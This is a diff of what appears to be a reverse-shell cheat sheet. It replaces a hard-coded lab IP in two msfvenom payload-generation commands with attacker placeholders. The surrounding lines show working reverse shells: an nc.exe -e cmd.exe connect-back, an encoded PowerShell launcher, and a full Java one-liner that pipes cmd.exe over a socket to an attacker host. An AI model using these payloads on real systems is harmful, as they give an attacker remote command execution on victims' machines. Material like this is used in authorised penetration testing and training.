@@ -31,8 +31,8 @@ $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient
 --------------------------------------------------------------------------------------------
 > nc.exe <IP-Attacker> <Port> -e cmd.exe
 > powershell -e base64_payload
-> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
-> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe
+> msfvenom -p windows/shell_reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f exe > nameoffile.exe
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP-Attacker> LPORT=<Port> -f exe > nameoffile.exe
 ````
 
 **Other Languages**
@@ -79,8 +79,6 @@ int port=<Port>;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ````
-
-
 
 Visit this website: https://www.revshells.com/
 
